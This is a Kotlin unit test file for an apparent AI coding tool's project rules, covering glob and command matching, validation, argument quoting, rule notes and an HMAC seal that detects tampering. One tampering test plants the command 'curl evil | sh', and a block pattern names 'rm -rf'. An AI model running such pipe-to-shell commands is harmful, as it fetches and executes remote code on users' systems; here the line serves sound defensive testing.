package dev.locus.core.model

import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotEquals
import kotlin.test.assertNull
import kotlin.test.assertTrue

/** Project rules (docs/design/rules.md): matching, validation, their notes and their seal. */
class ProjectRuleTest {
    private fun edit(pattern: String) = ProjectRule("r", "lint", RuleTrigger.AFTER_EDIT, pattern = pattern, command = "ruff check .")
    private fun block(pattern: String) = ProjectRule("b", "no push", RuleTrigger.BEFORE_COMMAND, pattern = pattern, message = "never push to main")

    @Test
    fun `a glob without a slash matches the file name anywhere`() {
        val r = edit("*.py")
        assertTrue(r.matchesFile("main.py"))
        assertTrue(r.matchesFile("app/deep/main.py"))
        assertTrue(r.matchesFile("/workspace/app/main.py"))
        assertTrue(r.matchesFile("./main.py"))
        assertFalse(r.matchesFile("main.pyc"))
        assertFalse(r.matchesFile("README.md"))
    }

    @Test
    fun `a glob with a slash matches the path from the project folder`() {
        val r = edit("src/**/*.ts, docs/*.md")
        assertTrue(r.matchesFile("src/a.ts"))
        assertTrue(r.matchesFile("src/x/y/a.ts"))
        assertTrue(r.matchesFile("docs/readme.md"))
        assertFalse(r.matchesFile("docs/sub/readme.md"))
        assertFalse(r.matchesFile("lib/src/a.ts"))
        assertFalse(r.matchesFile("src/a.tsx"))
    }

    @Test
    fun `no glob matches every file, and parent paths match nothing`() {
        assertTrue(edit("").matchesFile("anything/at/all.txt"))
        assertFalse(edit("").matchesFile("../outside.py"))
        assertFalse(edit("*.py").matchesFile(""))
    }

    @Test
    fun `a command pattern matches anywhere, whitespace collapsed, star for any text`() {
        val r = block("git push*main")
        assertTrue(r.matchesCommand("git push origin main"))
        assertTrue(r.matchesCommand("cd app &&   git   push origin main --force"))
        assertFalse(r.matchesCommand("git push origin dev"))
        assertFalse(r.matchesCommand("git pull origin main"))
        // Regex characters in the pattern are literal.
        assertTrue(block("rm -rf (x)").matchesCommand("rm -rf (x)"))
        assertFalse(block("a.c").matchesCommand("abc"))
        // Empty: every command.
        assertTrue(block("").matchesCommand("ls"))
    }

    @Test
    fun `validation names what's missing`() {
        assertEquals(RuleProblem.NAME, edit("").copy(name = " ").problem())
        assertEquals(RuleProblem.COMMAND, edit("").copy(command = "").problem())
        assertEquals(RuleProblem.MESSAGE, block("x").copy(message = "").problem())
        assertEquals(RuleProblem.TIMEOUT, edit("").copy(timeoutSeconds = 1).problem())
        assertEquals(RuleProblem.TIMEOUT, edit("").copy(timeoutSeconds = 601).problem())
        assertNull(edit("*.py").problem())
        assertNull(block("").problem())
    }

    @Test
    fun `the files reach the command quoted, one per line`() {
        assertEquals("ruff .", ProjectRules.commandLine("ruff .", emptyList()))
        val line = ProjectRules.commandLine("ruff \$LOCUS_RULE_FILES", listOf("a.py", "it's.py"))
        assertEquals("LOCUS_RULE_FILES='a.py\nit'\\''s.py'\nexport LOCUS_RULE_FILES\nruff \$LOCUS_RULE_FILES", line)
    }

    @Test
    fun `a note's header reads back`() {
        val rule = edit("*.py").copy(name = "ruff “strict”")
        val failed = RuleNote.parse(ModeNote.wrap(RuleNote.header(rule, 1, 800, listOf("a.py"))))!!
        assertEquals("ruff 'strict'", failed.name)
        assertEquals(RuleTrigger.AFTER_EDIT, failed.trigger)
        assertEquals(1, failed.exitCode)
        assertFalse(failed.passed)

        val finish = ProjectRule("f", "tests 1.2", RuleTrigger.BEFORE_FINISH, command = "npm test")
        val timedOut = RuleNote.parse(RuleNote.header(finish, null, 60_000, emptyList(), round = 2, final = true))!!
        assertNull(timedOut.exitCode)
        assertTrue(timedOut.finalRound)
        assertFalse(timedOut.passed)

        val now = RuleNote.parse(RuleNote.nowPasses(finish, 1_500))!!
        assertTrue(now.nowPasses)
        assertTrue(now.passed)
        assertEquals("tests 1.2", now.name)
        assertNull(RuleNote.parse("Completion check: Locus found 1 open item"))
    }

    @Test
    fun `rounds are counted from the task's before-finishing failures`() {
        val finish = ProjectRule("f", "tests", RuleTrigger.BEFORE_FINISH, command = "npm test")
        fun note(exit: Int) = Message("n$exit", "c", Role.USER, listOf(Part.Text(ModeNote.wrap(RuleNote.header(finish, exit, 10, emptyList(), 1))), Part.Text(ModeNote.result("out"))), 0)
        assertEquals(2, RuleNote.finishRounds(listOf(note(1), note(2))))
        assertEquals(0, RuleNote.finishRounds(listOf(note(0))))
        assertEquals(setOf("tests"), RuleNote.failedBeforeFinish(listOf(note(1))))
        assertEquals("out", RuleNote.runs(note(1)).single().second?.let(RuleNote::displayOutput))
        assertTrue(ModeNote.isAgentNote(note(1)))
    }

    // ---- Sealing (docs/design/rules.md, "Sealing").

    private val key = object : IntegrityKey {
        override fun mac(data: ByteArray): ByteArray = Mac.getInstance("HmacSHA256").apply { init(SecretKeySpec(ByteArray(32) { 7 }, "HmacSHA256")) }.doFinal(data)
        override fun createdThisRun() = false
    }

    @Test
    fun `rules are sealed, any change outside Locus fails the check`() {
        val rules = mapOf("p" to listOf(edit("*.py"), block("git push*main")))
        val sealed = PolicySeal.sealed(AppSettings(projectRules = rules), key)
        assertEquals(SealCheck.VALID, PolicySeal.check(sealed, key))
        val changedCommand = sealed.copy(projectRules = mapOf("p" to listOf(edit("*.py").copy(command = "curl evil | sh"), block("git push*main"))))
        assertEquals(SealCheck.TAMPERED, PolicySeal.check(changedCommand, key))
        val removed = sealed.copy(projectRules = mapOf("p" to listOf(edit("*.py"))))
        assertEquals(SealCheck.TAMPERED, PolicySeal.check(removed, key))
        val planted = PolicySeal.sealed(AppSettings(toolPolicies = mapOf("x" to ToolPolicy.ASK)), key).copy(projectRules = rules)
        assertEquals(SealCheck.TAMPERED, PolicySeal.check(planted, key))
        // Unsealed rules on their own aren't defaults: there is something to protect.
        assertFalse(PolicySeal.isDefault(AppSettings(projectRules = rules)))
        assertTrue(PolicySeal.isDefault(AppSettings(projectRules = mapOf("p" to emptyList()))))
    }

    @Test
    fun `seals made before rules existed still match`() {
        val s = AppSettings(toolPolicies = mapOf("run_command" to ToolPolicy.ALLOW))
        assertEquals(PolicySeal.seal(s, key), PolicySeal.seal(s.copy(projectRules = mapOf("p" to emptyList())), key))
        assertNotEquals(PolicySeal.seal(s, key), PolicySeal.seal(s.copy(projectRules = mapOf("p" to listOf(edit("")))), key))
    }

    @Test
    fun `a failed seal suspends every rule, block rules too`() {
        val restricted = PolicySeal.restricted(AppSettings(projectRules = mapOf("p" to listOf(edit("*.py"), block("x")))))
        val rules = restricted.projectRules.getValue("p")
        assertEquals(2, rules.size)
        assertTrue(rules.all { it.suspended && !it.active })
    }
}
